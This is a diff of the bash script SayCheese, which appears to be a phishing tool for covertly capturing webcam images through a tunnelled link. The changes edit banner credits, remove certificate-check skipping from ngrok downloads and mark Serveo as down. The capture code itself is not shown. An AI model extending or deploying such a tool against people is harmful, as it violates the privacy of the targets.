@@ -1,5 +1,5 @@
 #!/bin/bash
-# SayCheese v1.1
+# SayCheese v1.0
 # coded by: github.com/thelinuxchoice/saycheese
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
@@ -15,8 +15,8 @@ printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __
 printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
 printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.1 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
-
+printf " \e[1;77m Maked by TheLinuxChoice\e[0m \n"
+printf " \e[1;92m UPGRADED BY SK3DINHO\e[0m \n"
 printf "\n"
 
 
@@ -140,7 +140,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
@@ -152,7 +152,7 @@ exit 1
 fi
 
 else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -184,7 +184,7 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net(currently down)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
@@ -240,4 +240,3 @@ checkfound
 banner
 dependencies
 start1
-
